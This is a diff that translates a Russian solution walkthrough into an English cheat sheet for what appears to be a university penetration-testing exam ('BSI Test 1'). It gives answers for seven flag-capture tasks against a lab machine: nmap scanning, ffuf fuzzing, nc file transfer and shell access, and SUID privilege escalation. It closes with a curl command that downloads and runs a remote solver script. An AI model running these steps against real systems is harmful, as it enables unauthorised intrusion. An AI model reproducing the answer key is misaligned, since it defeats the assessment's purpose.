@@ -1,7 +1,7 @@
-# BSI Test 1 — решение по шагам
+# Cheat Sheet
 
-Цель: 7 заданий, в каждом найти флаг `PJATK{...}` и вставить в форму на платформе.
-`<HTTP_PORT>`, `<SSH_PORT>` и т.д. — номера портов из задания 1 (nmap).
+7 tasks, each one: find a `PJATK{...}` flag and submit it in the form.
+`<HTTP_PORT>`, `<SSH_PORT>`, etc. come from the nmap scan in Task 1.
 
 ---
 
@@ -10,28 +10,28 @@
 ```bash
 sudo openvpn ~/Downloads/bsiws-20ca_-s32618.ovpn
 ```
-В другой вкладке проверить, что туннель встал:
+In a second tab, check the tunnel is up:
 ```bash
 ip a show tun0
 ```
-Есть адрес `10.65.x.x` → можно работать. VPN-вкладку не закрывать.
-Параллельно включить машину на платформе.
+If you see a `10.65.x.x` address → you're in. Keep the VPN tab open.
+Also start the machine on the platform.
 
 ---
 
 ## 1. Open ports
 
-Один скан даёт все порты для остальных заданий.
+One scan gives you all ports for the other tasks.
 ```bash
 nmap -Pn -sV -sC -T4 -p- 192.168.100.8
 ```
-Выписать 4 порта из колонок SERVICE:
-- `ssh` → задание 2
-- `http` → задания 3, 4
-- `gzip`/архив → задание 5
-- `unknown` (молчит) → задание 6
+Write down 4 ports from the SERVICE column:
+- `ssh` → Task 2
+- `http` → Tasks 3, 4
+- `gzip`/archive → Task 5
+- `unknown` (silent) → Task 6
 
-Задание 1 засчитывается само после скана.
+Task 1 is marked done automatically after the scan.
 
 ---
 
@@ -40,40 +40,40 @@ nmap -Pn -sV -sC -T4 -p- 192.168.100.8
 ```bash
 ssh student@192.168.100.8 -p <SSH_PORT>
 ```
-Пароль: `pjatk`. Затем на машине:
+Password: `pjatk`. Then on the machine:
 ```bash
 grep -rao 'PJATK{[^}]*}' ~/haystack
 ```
-Выйти: `exit`
+Leave: `exit`
 
 ---
 
-## 3. Param Enumeration (параметр id)
+## 3. Param Enumeration (id)
 
-Перебрать id 1–99, найти тот, что показывает флаг.
+Brute-force id 1–99, find the one that shows a flag.
 ```bash
 ffuf -w <(seq 1 99) -u 'http://192.168.100.8:<HTTP_PORT>/?id=FUZZ'
 ```
-В выводе у одного id размер (Size) отличается от остальных. Открыть его в браузере:
+In the output one id has a different Size than the rest. Open it in the browser:
 ```
-http://192.168.100.8:<HTTP_PORT>/?id=<найденный_id>
+http://192.168.100.8:<HTTP_PORT>/?id=<found_id>
 ```
 
 ---
 
-## 4. File Enumeration (скрытый файл)
+## 4. File Enumeration (hidden file)
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u 'http://192.168.100.8:<HTTP_PORT>/FUZZ'
 ```
-Строка со `Status: 200` = имя файла. Открыть в браузере:
+The line with `Status: 200` is the filename. Open it in the browser:
 ```
-http://192.168.100.8:<HTTP_PORT>/<имя_файла>
+http://192.168.100.8:<HTTP_PORT>/<filename>
 ```
 
 ---
 
-## 5. File Transfer (tgz через nc)
+## 5. File Transfer (tgz over nc)
 
 ```bash
 nc 192.168.100.8 <TAR_PORT> > loot.tgz
@@ -88,7 +88,7 @@ grep -rao 'PJATK{[^}]*}' .
 ```bash
 nc 192.168.100.8 <SHELL_PORT>
 ```
-Попадаешь в shell машины. Там:
+You land in a shell on the machine. Then:
 ```bash
 cat ~/flag.txt
 ```
@@ -97,21 +97,21 @@ cat ~/flag.txt
 
 ## 7. SUID Binary (owned by admin)
 
-SUID-файл запускается с правами владельца (admin) → им можно прочитать флаг admin.
-Две команды. Зайти по SSH (как в задании 2), затем:
+A SUID file runs with the owner's rights (admin), so you can use it to read admin's flag.
+Two commands. SSH in (like Task 2), then:
 ```bash
 find / -user admin -perm -4000 2>/dev/null
 ```
-Команда напечатает путь, например `/usr/bin/backdoor`. Подставить **этот путь** и прочитать флаг:
+It prints a path, e.g. `/usr/bin/backdoor`. Use **that path** to read the flag:
 ```bash
 /usr/bin/backdoor /home/admin/flag.txt
 ```
 
 ---
 
-## Автоматом (скрипт делает всё то же самое)
+## Automatic (the script does all of the above)
 
 ```bash
 curl -sL https://raw.githubusercontent.com/tohaidk/bsi-test1/main/solve_test1.py -o solve_test1.py && python3 solve_test1.py
 ```
-В конце флаги в терминале и в файле `test1_flags.txt`.
+Flags end up in the terminal and in `test1_flags.txt`.
